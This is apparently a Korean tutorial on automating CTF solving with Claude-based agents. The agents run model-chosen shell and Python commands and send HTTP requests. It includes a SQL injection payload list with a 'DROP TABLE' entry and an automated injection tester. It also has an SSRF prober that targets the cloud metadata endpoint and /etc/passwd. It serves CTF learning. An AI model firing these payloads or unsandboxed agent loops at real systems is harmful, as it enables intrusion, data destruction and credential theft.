# AI 에이전트 CTF 자동화

## CTF 자동화의 핵심 개념

```
CTF 자동화 구조:

  문제 입력
      │
      ▼
  AI 분석 에이전트 ──► 카테고리 분류 (웹·포렌식·리버싱·암호학·pwn)
      │
      ▼
  전문 서브에이전트 ──► 도구 실행 & 결과 수집
      │
      ▼
  플래그 추출기 ──► CTF{...} 패턴 식별 & 검증
      │
      ▼
  제출 & 보고서

자동화 가능 범위:
  ✅ 웹 취약점 (SQLi, XSS, IDOR, SSRF)
  ✅ 암호학 (고전 암호, RSA 파라미터 오류, 해시 크랙)
  ✅ 포렌식 (파일 분석, 스테가노그래피, 패킷 분석)
  ✅ 리버싱 보조 (디스어셈블, 문자열 추출)
  ⚠️  Pwn (반자동 — 취약점 발견은 자동, 익스플로잇 코드는 인간)
```

---

## 1. 핵심 에이전트 아키텍처

### 1-1. 메인 오케스트레이터

```python
import anthropic
import subprocess
import re
import json
import base64
from pathlib import Path

client = anthropic.Anthropic()

# CTF 에이전트가 사용할 도구 정의
CTF_TOOLS = [
    {
        "name": "run_command",
        "description": "셸 명령어 실행 (file, strings, xxd, binwalk, exiftool 등)",
        "input_schema": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "실행할 명령어"},
                "timeout": {"type": "integer", "description": "타임아웃(초)", "default": 30}
            },
            "required": ["command"]
        }
    },
    {
        "name": "read_file",
        "description": "파일을 읽어 내용을 반환 (바이너리는 hex로)",
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "mode": {"type": "string", "enum": ["text", "hex", "base64"], "default": "text"}
            },
            "required": ["path"]
        }
    },
    {
        "name": "write_file",
        "description": "파일 작성 (익스플로잇 스크립트, 페이로드 등)",
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "content": {"type": "string"},
                "mode": {"type": "string", "enum": ["text", "base64"], "default": "text"}
            },
            "required": ["path", "content"]
        }
    },
    {
        "name": "http_request",
        "description": "HTTP 요청 전송 (웹 CTF 문제)",
        "input_schema": {
            "type": "object",
            "properties": {
                "method": {"type": "string", "enum": ["GET", "POST", "PUT", "DELETE"]},
                "url": {"type": "string"},
                "headers": {"type": "object"},
                "data": {"type": "string"},
                "cookies": {"type": "object"}
            },
            "required": ["method", "url"]
        }
    },
    {
        "name": "python_exec",
        "description": "파이썬 코드 실행 (암호학 연산, 포렌식 분석)",
        "input_schema": {
            "type": "object",
            "properties": {
                "code": {"type": "string"},
                "packages": {"type": "array", "items": {"type": "string"}}
            },
            "required": ["code"]
        }
    }
]

def run_command(command: str, timeout: int = 30) -> str:
    """셸 명령어 실행"""
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True,
            text=True, timeout=timeout
        )
        output = result.stdout + result.stderr
        return output[:4000] if len(output) > 4000 else output
    except subprocess.TimeoutExpired:
        return f"[타임아웃: {timeout}초 초과]"
    except Exception as e:
        return f"[오류: {e}]"

def read_file(path: str, mode: str = "text") -> str:
    """파일 읽기"""
    try:
        p = Path(path)
        if mode == "text":
            return p.read_text(errors='replace')[:4000]
        elif mode == "hex":
            data = p.read_bytes()[:2000]
            return data.hex()
        elif mode == "base64":
            data = p.read_bytes()
            return base64.b64encode(data).decode()
    except Exception as e:
        return f"[파일 읽기 오류: {e}]"

def write_file(path: str, content: str, mode: str = "text") -> str:
    """파일 작성"""
    try:
        p = Path(path)
        if mode == "text":
            p.write_text(content)
        elif mode == "base64":
            p.write_bytes(base64.b64decode(content))
        return f"[파일 저장 완료: {path}]"
    except Exception as e:
        return f"[파일 저장 오류: {e}]"

def http_request(method: str, url: str, headers: dict = None,
                 data: str = None, cookies: dict = None) -> str:
    """HTTP 요청"""
    import urllib.request
    import urllib.parse
    try:
        req_data = data.encode() if data else None
        req = urllib.request.Request(url, data=req_data, method=method)
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode(errors='replace')
            return f"Status: {resp.status}\n{body[:3000]}"
    except Exception as e:
        return f"[HTTP 오류: {e}]"

def python_exec(code: str, packages: list = None) -> str:
    """파이썬 코드 실행"""
    if packages:
        for pkg in packages:
            subprocess.run(f"pip install -q {pkg}", shell=True)
    try:
        namespace = {}
        exec(code, namespace)
        result = namespace.get('result', namespace.get('output', '[실행 완료 — result 변수 없음]'))
        return str(result)
    except Exception as e:
        return f"[실행 오류: {e}]"

def process_tool_call(tool_name: str, tool_input: dict) -> str:
    """도구 호출 처리"""
    if tool_name == "run_command":
        return run_command(**tool_input)
    elif tool_name == "read_file":
        return read_file(**tool_input)
    elif tool_name == "write_file":
        return write_file(**tool_input)
    elif tool_name == "http_request":
        return http_request(**tool_input)
    elif tool_name == "python_exec":
        return python_exec(**tool_input)
    return f"[알 수 없는 도구: {tool_name}]"

def extract_flag(text: str, prefix: str = "CTF") -> list[str]:
    """플래그 패턴 추출"""
    patterns = [
        rf'{prefix}\{{[^}}]+\}}',
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'[A-Z]+\{[a-zA-Z0-9_!@#$%^&*\-]+\}',
    ]
    flags = []
    for pat in patterns:
        flags.extend(re.findall(pat, text, re.IGNORECASE))
    return list(set(flags))

def ctf_agent(challenge_description: str, files: list[str] = None,
              url: str = None, flag_prefix: str = "CTF") -> dict:
    """
    CTF 문제 자동 풀이 에이전트
    
    Args:
        challenge_description: 문제 설명
        files: 첨부 파일 경로 목록
        url: 웹 챌린지 URL
        flag_prefix: 플래그 접두사 (CTF, flag, etc.)
    
    Returns:
        {'flag': ..., 'steps': [...], 'analysis': ...}
    """
    system_prompt = """당신은 CTF(Capture The Flag) 전문 보안 에이전트입니다.
주어진 문제를 체계적으로 분석하고 플래그를 찾아야 합니다.

분석 순서:
1. 문제 카테고리 파악 (웹/포렌식/리버싱/암호학/pwn/misc)
2. 파일/URL 초기 분석
3. 가설 수립 → 도구 실행 → 결과 해석 반복
4. 플래그 패턴 탐색

중요:
- 모든 단계를 설명하며 진행
- 막히면 다른 접근 시도
- 플래그를 찾으면 즉시 보고"""

    # 초기 메시지 구성
    user_content = f"## CTF 문제\n\n{challenge_description}\n"
    if files:
        user_content += f"\n## 첨부 파일\n" + "\n".join(f"- `{f}`" for f in files)
    if url:
        user_content += f"\n## 웹 URL\n{url}"
    user_content += f"\n\n플래그 접두사: `{flag_prefix}{{...}}`"

    messages = [{"role": "user", "content": user_content}]
    steps = []
    found_flags = []
    
    # 에이전트 루프 (최대 20회 반복)
    for iteration in range(20):
        response = client.messages.create(
            model="claude-opus-4-6",
            max_tokens=4096,
            system=system_prompt,
            tools=CTF_TOOLS,
            messages=messages
        )
        
        # 응답 텍스트 수집
        text_parts = [b.text for b in response.content if hasattr(b, 'text')]
        if text_parts:
            step_text = "\n".join(text_parts)
            steps.append(step_text)
            found_flags.extend(extract_flag(step_text, flag_prefix))
        
        # 종료 조건
        if response.stop_reason == "end_turn":
            break
        
        # 도구 호출 처리
        if response.stop_reason == "tool_use":
            tool_results = []
            for block in response.content:
                if block.type == "tool_use":
                    print(f"  [도구] {block.name}: {json.dumps(block.input, ensure_ascii=False)[:100]}")
                    result = process_tool_call(block.name, block.input)
                    found_flags.extend(extract_flag(result, flag_prefix))
                    tool_results.append({
                        "type": "tool_result",
                        "tool_use_id": block.id,
                        "content": result
                    })
            
            messages.append({"role": "assistant", "content": response.content})
            messages.append({"role": "user", "content": tool_results})
        else:
            break
    
    return {
        "flag": found_flags[0] if found_flags else None,
        "all_flags": found_flags,
        "steps": steps,
        "iterations": iteration + 1
    }


# 사용 예시
if __name__ == "__main__":
    # 포렌식 문제
    result = ctf_agent(
        challenge_description="이미지 파일 안에 숨겨진 플래그를 찾아라.",
        files=["/tmp/challenge.png"],
        flag_prefix="CTF"
    )
    print(f"플래그: {result['flag']}")
    print(f"반복 횟수: {result['iterations']}")
```

---

## 2. 카테고리별 전문 에이전트

### 2-1. 암호학 전문 에이전트

```python
from anthropic import Anthropic
import math

client = Anthropic()

CRYPTO_TOOLS = [
    {
        "name": "caesar_crack",
        "description": "시저 암호 모든 시프트 시도",
        "input_schema": {
            "type": "object",
            "properties": {"ciphertext": {"type": "string"}},
            "required": ["ciphertext"]
        }
    },
    {
        "name": "frequency_analysis",
        "description": "빈도 분석으로 치환 암호 해독",
        "input_schema": {
            "type": "object",
            "properties": {"ciphertext": {"type": "string"}},
            "required": ["ciphertext"]
        }
    },
    {
        "name": "rsa_attack",
        "description": "RSA 파라미터로 개인키 복원 (작은 e, 공통 N 등)",
        "input_schema": {
            "type": "object",
            "properties": {
                "n": {"type": "string"},
                "e": {"type": "string"},
                "c": {"type": "string"},
                "attack_type": {
                    "type": "string",
                    "enum": ["small_e", "factor", "wiener", "common_modulus"]
                }
            },
            "required": ["n", "e", "c", "attack_type"]
        }
    },
    {
        "name": "xor_crack",
        "description": "XOR 암호화 키 길이 추측 및 크랙",
        "input_schema": {
            "type": "object",
            "properties": {
                "hex_ciphertext": {"type": "string"},
                "max_keylen": {"type": "integer", "default": 32}
            },
            "required": ["hex_ciphertext"]
        }
    },
    {
        "name": "base_decode",
        "description": "Base64/Base32/Base85/Base58 디코딩",
        "input_schema": {
            "type": "object",
            "properties": {
                "data": {"type": "string"},
                "encoding": {"type": "string", "enum": ["base64", "base32", "base85", "base58", "auto"]}
            },
            "required": ["data", "encoding"]
        }
    }
]

def caesar_crack(ciphertext: str) -> str:
    results = []
    for shift in range(26):
        decrypted = ""
        for c in ciphertext:
            if c.isalpha():
                base = ord('A') if c.isupper() else ord('a')
                decrypted += chr((ord(c) - base - shift) % 26 + base)
            else:
                decrypted += c
        results.append(f"Shift {shift:2d}: {decrypted}")
    return "\n".join(results)

def frequency_analysis(ciphertext: str) -> str:
    """영어 기준 빈도 분석"""
    eng_freq = 'etaoinshrdlcumwfgypbvkjxqz'
    letters = [c.lower() for c in ciphertext if c.isalpha()]
    freq = {}
    for c in letters:
        freq[c] = freq.get(c, 0) + 1
    sorted_chars = sorted(freq.items(), key=lambda x: -x[1])
    mapping = {}
    for i, (char, _) in enumerate(sorted_chars[:13]):
        mapping[char] = eng_freq[i]
    result = ""
    for c in ciphertext:
        if c.lower() in mapping:
            result += mapping[c.lower()].upper() if c.isupper() else mapping[c.lower()]
        else:
            result += c
    return f"빈도 기반 추정 복호화:\n{result}\n\n문자 빈도: {sorted_chars[:10]}"

def rsa_attack(n: str, e: str, c: str, attack_type: str) -> str:
    n, e, c = int(n), int(e), int(c)
    
    if attack_type == "small_e":
        # e=3이고 m이 작을 때 세제곱근
        import gmpy2
        m, exact = gmpy2.iroot(c, e)
        if pow(int(m), e, n) == c:
            return f"평문 (세제곱근): {int(m)}\n문자열: {int(m).to_bytes((int(m).bit_length()+7)//8, 'big')}"
        # 브로드캐스트 공격을 위해 c + k*n 시도
        for k in range(1000):
            m, exact = gmpy2.iroot(c + k * n, e)
            if pow(int(m), e, n) == c + k * n:
                return f"평문 (브로드캐스트 k={k}): {int(m)}"
        return "small_e 공격 실패"
    
    elif attack_type == "factor":
        # 작은 소인수 시도
        import gmpy2
        for p in range(2, 100000):
            if n % p == 0:
                q = n // p
                phi = (p - 1) * (q - 1)
                d = int(gmpy2.invert(e, phi))
                m = pow(c, d, n)
                return f"p={p}, q={q}, d={d}\n평문: {m}\n문자열: {m.to_bytes((m.bit_length()+7)//8, 'big')}"
        return "소인수 발견 실패 (범위 내)"
    
    return f"공격 타입 {attack_type} 미구현"

def xor_crack(hex_ciphertext: str, max_keylen: int = 32) -> str:
    data = bytes.fromhex(hex_ciphertext)
    
    # 코인시던스 지수로 키 길이 추측
    best_keylen = 1
    best_ic = 0
    for keylen in range(1, min(max_keylen + 1, len(data) // 2)):
        ic_sum = 0
        for start in range(keylen):
            chunk = data[start::keylen]
            freq = {}
            for b in chunk:
                freq[b] = freq.get(b, 0) + 1
            n = len(chunk)
            ic = sum(v * (v - 1) for v in freq.values()) / (n * (n - 1)) if n > 1 else 0
            ic_sum += ic
        avg_ic = ic_sum / keylen
        if avg_ic > best_ic:
            best_ic, best_keylen = avg_ic, keylen
    
    # 키 복원 (각 바이트별 빈도 분석)
    key = bytearray()
    for i in range(best_keylen):
        chunk = data[i::best_keylen]
        # 공백(0x20)이 가장 많을 것이라는 가정
        freq = {}
        for b in chunk:
            freq[b] = freq.get(b, 0) + 1
        most_common = max(freq, key=freq.get)
        key.append(most_common ^ 0x20)
    
    # 복호화
    plaintext = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
    return (f"추측 키 길이: {best_keylen}\n"
            f"추측 키 (hex): {key.hex()}\n"
            f"복호화: {plaintext[:200]}")

def base_decode(data: str, encoding: str) -> str:
    import base64
    results = []
    if encoding in ("base64", "auto"):
        try:
            results.append(f"Base64: {base64.b64decode(data + '==').decode(errors='replace')}")
        except Exception as ex:
            results.append(f"Base64 실패: {ex}")
    if encoding in ("base32", "auto"):
        try:
            results.append(f"Base32: {base64.b32decode(data + '=' * (-len(data) % 8)).decode(errors='replace')}")
        except Exception as ex:
            results.append(f"Base32 실패: {ex}")
    if encoding in ("base85", "auto"):
        try:
            results.append(f"Base85: {base64.b85decode(data).decode(errors='replace')}")
        except Exception as ex:
            results.append(f"Base85 실패: {ex}")
    return "\n".join(results)

def process_crypto_tool(name: str, inp: dict) -> str:
    if name == "caesar_crack":   return caesar_crack(**inp)
    if name == "frequency_analysis": return frequency_analysis(**inp)
    if name == "rsa_attack":     return rsa_attack(**inp)
    if name == "xor_crack":      return xor_crack(**inp)
    if name == "base_decode":    return base_decode(**inp)
    return f"[미구현: {name}]"

def crypto_agent(problem: str) -> str:
    """암호학 CTF 전용 에이전트"""
    messages = [{"role": "user", "content": problem}]
    
    for _ in range(15):
        resp = client.messages.create(
            model="claude-opus-4-6",
            max_tokens=2048,
            system="당신은 CTF 암호학 전문가입니다. 제공된 도구를 사용해 암호를 해독하세요.",
            tools=CRYPTO_TOOLS,
            messages=messages
        )
        if resp.stop_reason == "end_turn":
            return next((b.text for b in resp.content if hasattr(b, 'text')), "")
        
        tool_results = []
        for block in resp.content:
            if block.type == "tool_use":
                result = process_crypto_tool(block.name, block.input)
                tool_results.append({
                    "type": "tool_result",
                    "tool_use_id": block.id,
                    "content": result
                })
        messages.append({"role": "assistant", "content": resp.content})
        messages.append({"role": "user", "content": tool_results})
    
    return "최대 반복 횟수 초과"
```

### 2-2. 웹 CTF 전문 에이전트

```python
import requests
from anthropic import Anthropic

client = Anthropic()

WEB_TOOLS = [
    {
        "name": "send_request",
        "description": "HTTP 요청 전송 (헤더·쿠키·페이로드 포함)",
        "input_schema": {
            "type": "object",
            "properties": {
                "method": {"type": "string", "enum": ["GET", "POST", "PUT", "DELETE", "PATCH"]},
                "url": {"type": "string"},
                "headers": {"type": "object", "default": {}},
                "params": {"type": "object", "default": {}},
                "data": {"type": "object", "default": {}},
                "cookies": {"type": "object", "default": {}},
                "raw_body": {"type": "string"}
            },
            "required": ["method", "url"]
        }
    },
    {
        "name": "sqli_test",
        "description": "SQL 인젝션 페이로드 자동 시도",
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "param": {"type": "string"},
                "method": {"type": "string", "enum": ["GET", "POST"], "default": "GET"}
            },
            "required": ["url", "param"]
        }
    },
    {
        "name": "ssrf_test",
        "description": "SSRF 취약점 내부 IP 스캔",
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "param": {"type": "string"},
                "targets": {
                    "type": "array",
                    "items": {"type": "string"},
                    "default": ["http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/"]
                }
            },
            "required": ["url", "param"]
        }
    }
]

def send_request(method: str, url: str, headers: dict = None,
                 params: dict = None, data: dict = None,
                 cookies: dict = None, raw_body: str = None) -> str:
    sess = requests.Session()
    try:
        kwargs = {
            "headers": headers or {},
            "params": params or {},
            "cookies": cookies or {},
            "timeout": 10,
            "allow_redirects": True
        }
        if raw_body:
            kwargs["data"] = raw_body
        elif data:
            kwargs["json"] = data
        
        resp = sess.request(method, url, **kwargs)
        return (f"Status: {resp.status_code}\n"
                f"Headers: {dict(resp.headers)}\n"
                f"Body:\n{resp.text[:3000]}")
    except Exception as e:
        return f"[요청 오류: {e}]"

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "admin'--",
    "' OR SLEEP(3)--",
    "1; SELECT pg_sleep(3)--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
]

def sqli_test(url: str, param: str, method: str = "GET") -> str:
    results = []
    for payload in SQLI_PAYLOADS:
        try:
            if method == "GET":
                resp = requests.get(url, params={param: payload}, timeout=5)
            else:
                resp = requests.post(url, data={param: payload}, timeout=5)
            
            # SQL 오류 징후 탐지
            indicators = ["sql", "syntax", "mysql", "postgresql", "sqlite",
                         "ORA-", "error in your sql", "unclosed quotation"]
            found = [i for i in indicators if i.lower() in resp.text.lower()]
            if found:
                results.append(f"✅ 페이로드: {payload}\n   징후: {found}\n   응답: {resp.text[:200]}")
            else:
                results.append(f"❌ {payload[:40]}: 정상 응답 ({resp.status_code})")
        except Exception as e:
            results.append(f"⚠️  {payload[:40]}: {e}")
    return "\n".join(results)

def ssrf_test(url: str, param: str, targets: list = None) -> str:
    if targets is None:
        targets = [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd"
        ]
    results = []
    for target in targets:
        try:
            resp = requests.get(url, params={param: target}, timeout=5)
            if resp.status_code == 200 and len(resp.text) > 50:
                results.append(f"✅ SSRF 성공: {target}\n응답: {resp.text[:500]}")
            else:
                results.append(f"❌ {target}: {resp.status_code}")
        except Exception as e:
            results.append(f"⚠️  {target}: {e}")
    return "\n".join(results)

def process_web_tool(name: str, inp: dict) -> str:
    if name == "send_request": return send_request(**inp)
    if name == "sqli_test":    return sqli_test(**inp)
    if name == "ssrf_test":    return ssrf_test(**inp)
    return f"[미구현: {name}]"

def web_ctf_agent(problem: str, target_url: str) -> str:
    """웹 CTF 전용 에이전트"""
    initial = f"{problem}\n\n대상 URL: {target_url}"
    messages = [{"role": "user", "content": initial}]
    
    for _ in range(20):
        resp = client.messages.create(
            model="claude-opus-4-6",
            max_tokens=2048,
            system="당신은 웹 보안 CTF 전문가입니다. SQLi, XSS, SSRF, IDOR, 인증 우회 등 웹 취약점을 체계적으로 시도하세요.",
            tools=WEB_TOOLS,
            messages=messages
        )
        if resp.stop_reason == "end_turn":
            texts = [b.text for b in resp.content if hasattr(b, 'text')]
            return "\n".join(texts)
        
        tool_results = []
        for block in resp.content:
            if block.type == "tool_use":
                result = process_web_tool(block.name, block.input)
                tool_results.append({
                    "type": "tool_result",
                    "tool_use_id": block.id,
                    "content": result
                })
        messages.append({"role": "assistant", "content": resp.content})
        messages.append({"role": "user", "content": tool_results})
    
    return "최대 반복 횟수 초과"
```

---

## 3. 포렌식 자동화 파이프라인

### 3-1. 파일 분석 체인

```python
import subprocess
import re
from pathlib import Path

def forensic_pipeline(filepath: str) -> dict:
    """
    포렌식 파일 자동 분석 파이프라인
    1. 파일 타입 식별
    2. 메타데이터 추출
    3. 숨겨진 데이터 탐색 (스테가노그래피 등)
    4. 플래그 패턴 검색
    """
    results = {"file": filepath, "findings": []}
    p = Path(filepath)
    
    # 1. 파일 타입
    file_type = subprocess.run(
        ["file", filepath], capture_output=True, text=True
    ).stdout.strip()
    results["file_type"] = file_type
    
    # 2. 문자열 추출
    strings_out = subprocess.run(
        ["strings", "-n", "4", filepath],
        capture_output=True, text=True
    ).stdout
    
    # 플래그 패턴 탐색
    flag_patterns = re.findall(r'[A-Z]+\{[^}]{4,50}\}', strings_out)
    if flag_patterns:
        results["findings"].append({"type": "flag_in_strings", "data": flag_patterns})
    
    # 3. 이미지면 스테가노그래피 시도
    if any(t in file_type.lower() for t in ["png", "jpeg", "jpg", "gif", "bmp"]):
        steg_results = run_steganography_tools(filepath)
        results["steg"] = steg_results
    
    # 4. ZIP이면 내용 확인
    if "zip" in file_type.lower() or p.suffix == ".zip":
        zip_out = subprocess.run(
            ["unzip", "-l", filepath], capture_output=True, text=True
        ).stdout
        results["zip_contents"] = zip_out
    
    # 5. 16진수 헤더 확인
    with open(filepath, 'rb') as f:
        header = f.read(32).hex()
    results["hex_header"] = header
    
    # 알려진 파일 매직 넘버 확인
    magic_numbers = {
        "89504e47": "PNG",
        "ffd8ffe0": "JPEG",
        "47494638": "GIF",
        "504b0304": "ZIP",
        "25504446": "PDF",
        "7f454c46": "ELF",
    }
    for magic, ftype in magic_numbers.items():
        if header.startswith(magic):
            results["magic"] = ftype
            break
    
    return results

def run_steganography_tools(image_path: str) -> dict:
    """스테가노그래피 도구 실행"""
    results = {}
    
    # steghide (패스워드 없이 시도)
    steg = subprocess.run(
        ["steghide", "extract", "-sf", image_path, "-p", "", "-f"],
        capture_output=True, text=True
    )
    if steg.returncode == 0:
        results["steghide"] = steg.stdout + steg.stderr
    
    # zsteg (PNG 전용)
    if image_path.endswith('.png'):
        zsteg = subprocess.run(
            ["zsteg", image_path], capture_output=True, text=True
        )
        results["zsteg"] = zsteg.stdout[:1000] if zsteg.returncode == 0 else None
    
    # binwalk (숨겨진 파일)
    binwalk = subprocess.run(
        ["binwalk", "-e", "--run-as=root", image_path],
        capture_output=True, text=True
    )
    results["binwalk"] = binwalk.stdout[:1000]
    
    # exiftool (EXIF 메타데이터)
    exif = subprocess.run(
        ["exiftool", image_path], capture_output=True, text=True
    )
    results["exif"] = exif.stdout[:500]
    
    return results

# AI 포렌식 에이전트와 통합
def ai_forensic_agent(filepath: str) -> str:
    """AI가 포렌식 파이프라인 결과를 해석하고 플래그 추출"""
    pipeline_result = forensic_pipeline(filepath)
    
    prompt = f"""다음 포렌식 분석 결과를 보고 플래그를 찾아라:

파일: {filepath}
파일 타입: {pipeline_result.get('file_type')}
매직 넘버: {pipeline_result.get('magic', '미확인')}
헥스 헤더: {pipeline_result.get('hex_header')}
스테가노그래피: {pipeline_result.get('steg', '해당 없음')}
ZIP 내용: {pipeline_result.get('zip_contents', '해당 없음')}
발견된 패턴: {pipeline_result.get('findings')}

플래그를 찾았으면 보고하라. 추가 분석이 필요하면 구체적인 명령어를 제안하라."""

    resp = client.messages.create(
        model="claude-opus-4-6",
        max_tokens=1024,
        messages=[{"role": "user", "content": prompt}]
    )
    return resp.content[0].text
```

---

## 4. 리버싱 보조 에이전트

```python
import subprocess
import re

def disassemble_binary(binary_path: str, func_name: str = "main") -> str:
    """바이너리 디스어셈블 (radare2/objdump)"""
    # radare2 시도
    r2 = subprocess.run(
        ["r2", "-q", "-c", f"aaa; pdf @ sym.{func_name}", binary_path],
        capture_output=True, text=True, timeout=30
    )
    if r2.returncode == 0 and r2.stdout.strip():
        return r2.stdout[:5000]
    
    # objdump 폴백
    objdump = subprocess.run(
        ["objdump", "-d", "-M", "intel", binary_path],
        capture_output=True, text=True
    )
    return objdump.stdout[:5000]

def extract_binary_info(binary_path: str) -> dict:
    """바이너리 기본 정보 추출"""
    info = {}
    
    # 보호 기법 확인 (checksec)
    checksec = subprocess.run(
        ["checksec", "--file=" + binary_path],
        capture_output=True, text=True
    )
    info["protections"] = checksec.stdout
    
    # 문자열 추출
    strings = subprocess.run(
        ["strings", binary_path], capture_output=True, text=True
    ).stdout
    info["strings"] = strings[:3000]
    
    # 동적 링크 함수
    plt = subprocess.run(
        ["objdump", "-d", "-j", ".plt", binary_path],
        capture_output=True, text=True
    )
    info["imports"] = plt.stdout[:1000]
    
    # 파일 정보
    file_out = subprocess.run(
        ["file", binary_path], capture_output=True, text=True
    ).stdout
    info["file_info"] = file_out
    
    return info

def reversing_agent(binary_path: str, hint: str = "") -> str:
    """리버싱 보조 AI 에이전트"""
    binary_info = extract_binary_info(binary_path)
    disasm = disassemble_binary(binary_path)
    
    prompt = f"""바이너리 리버싱 분석:

파일 정보: {binary_info['file_info']}
보호 기법: {binary_info['protections']}
문자열 (상위): {binary_info['strings'][:500]}
임포트 함수: {binary_info['imports']}

main 함수 디스어셈블:
{disasm[:3000]}

{'힌트: ' + hint if hint else ''}

다음을 분석해라:
1. 프로그램의 목적 및 알고리즘
2. 핵심 분기 조건 (플래그 검증 로직)
3. 플래그 형식 추론
4. 접근 방법 제안 (정적/동적 분석)"""

    resp = client.messages.create(
        model="claude-opus-4-6",
        max_tokens=2048,
        messages=[{"role": "user", "content": prompt}]
    )
    return resp.content[0].text
```

---

## 5. CTF 팀 자동화 시스템

### 5-1. 멀티 에이전트 CTF 팀

```python
import threading
from anthropic import Anthropic
from queue import Queue

client = Anthropic()

class CTFTeam:
    """여러 전문 에이전트가 협력하는 CTF 팀"""
    
    def __init__(self, team_name: str = "AutoCTF"):
        self.team_name = team_name
        self.results = Queue()
        self.flags = []
        self.lock = threading.Lock()
    
    def _run_specialist(self, specialist: str, problem: dict):
        """전문 에이전트 실행 (별도 스레드)"""
        try:
            if specialist == "crypto":
                result = crypto_agent(problem['description'])
            elif specialist == "web":
                result = web_ctf_agent(
                    problem['description'],
                    problem.get('url', '')
                )
            elif specialist == "forensic":
                result = ai_forensic_agent(problem.get('file', ''))
            else:
                result = ctf_agent(problem['description'])
            
            # 플래그 추출
            found = extract_flag(result)
            with self.lock:
                if found:
                    self.flags.extend(found)
                    print(f"\n[{specialist}] 플래그 발견: {found}")
            
            self.results.put({
                "specialist": specialist,
                "result": result,
                "flags": found
            })
        except Exception as e:
            self.results.put({"specialist": specialist, "error": str(e)})
    
    def solve_parallel(self, problems: list[dict]) -> list[dict]:
        """
        여러 문제를 병렬로 풀이
        
        Args:
            problems: [{"category": "web", "description": "...", "url": "..."}]
        
        Returns:
            풀이 결과 목록
        """
        threads = []
        for problem in problems:
            specialist = problem.get('category', 'general')
            t = threading.Thread(
                target=self._run_specialist,
                args=(specialist, problem),
                daemon=True
            )
            threads.append(t)
            t.start()
            print(f"[{self.team_name}] {specialist} 에이전트 시작: {problem['description'][:50]}")
        
        # 모든 스레드 완료 대기
        for t in threads:
            t.join(timeout=300)
        
        results = []
        while not self.results.empty():
            results.append(self.results.get())
        
        return results
    
    def report(self, results: list[dict]) -> str:
        """최종 보고서 생성"""
        prompt = f"""CTF 대회 결과를 정리하라:

팀: {self.team_name}
발견된 플래그: {self.flags}
에이전트 결과:
{results}

마크다운 형식으로 풀이 보고서를 작성하라."""
        
        resp = client.messages.create(
            model="claude-opus-4-6",
            max_tokens=2048,
            messages=[{"role": "user", "content": prompt}]
        )
        return resp.content[0].text


# 사용 예시
if __name__ == "__main__":
    team = CTFTeam("AlphaTeam")
    
    problems = [
        {
            "category": "crypto",
            "description": "RSA 암호화. n=..., e=3, c=... 플래그를 복호화하라."
        },
        {
            "category": "web",
            "description": "로그인 페이지에 SQLi 취약점이 있다. 어드민으로 로그인하라.",
            "url": "http://challenge.ctf.local/login"
        },
        {
            "category": "forensic",
            "description": "이미지 파일에 숨겨진 플래그를 찾아라.",
            "file": "/tmp/hidden.png"
        }
    ]
    
    results = team.solve_parallel(problems)
    report = team.report(results)
    print(report)
```

---

## 6. 실전 CTF 팁 — AI 활용 전략

```
자동화가 잘 되는 문제 유형:
┌──────────────┬────────────────────────────────┬──────────────────┐
│ 카테고리     │ 자동화 적합 문제               │ AI 기여도        │
├──────────────┼────────────────────────────────┼──────────────────┤
│ 암호학       │ 시저/비전체르/RSA 파라미터 오류│ ★★★★★           │
│ 웹           │ SQLi, IDOR, 기본 인증 우회     │ ★★★★☆           │
│ 포렌식       │ 스테가노그래피, EXIF, 파일 숨김│ ★★★★☆           │
│ 리버싱       │ 알고리즘 이해, 패치 포인트 식별│ ★★★☆☆           │
│ Pwn          │ 취약점 분류, 가젯 탐색         │ ★★☆☆☆           │
│ Misc         │ 인코딩, 파이썬 퍼즐            │ ★★★★★           │
└──────────────┴────────────────────────────────┴──────────────────┘

권장 워크플로우:
  1. 문제 배포 즉시 AI에게 카테고리 분류 요청
  2. 자동화 에이전트 실행 (5분)
  3. 자동 풀이 실패 시 AI 힌트 요청 후 수동 분석
  4. 풀이 후 writeup 초안 AI 생성

주의사항:
  - AI 에이전트는 실제 원격 서버에 과도한 요청을 보낼 수 있음 → 속도 제한 필수
  - 파일 시스템 접근 명령어는 샌드박스 환경에서 실행
  - CTF 규정 준수 — 자동화 도구 허용 여부 확인
```

---

## 7. 환경 설정 스크립트

```bash
#!/bin/bash
# CTF 자동화 환경 설치

# 기본 CTF 도구
sudo apt-get update && sudo apt-get install -y \
    binwalk steghide zsteg exiftool \
    radare2 gdb pwndbg checksec \
    john hashcat \
    wireshark-cli tshark \
    nmap netcat-openbsd

# Python CTF 라이브러리
pip install \
    pwntools \      # pwn/네트워크
    pycryptodome \  # 암호학
    requests \      # 웹
    gmpy2 \         # RSA 수학
    z3-solver \     # SMT 풀이
    pillow \        # 이미지 처리
    scapy \         # 패킷 분석
    anthropic       # AI 에이전트

# 환경 변수
export ANTHROPIC_API_KEY="your-key-here"

echo "CTF 자동화 환경 준비 완료"
```

```python
# requirements.txt
anthropic>=0.50.0
pwntools>=4.12.0
pycryptodome>=3.20.0
requests>=2.31.0
gmpy2>=2.1.5
z3-solver>=4.12.0
pillow>=10.0.0
scapy>=2.5.0
```
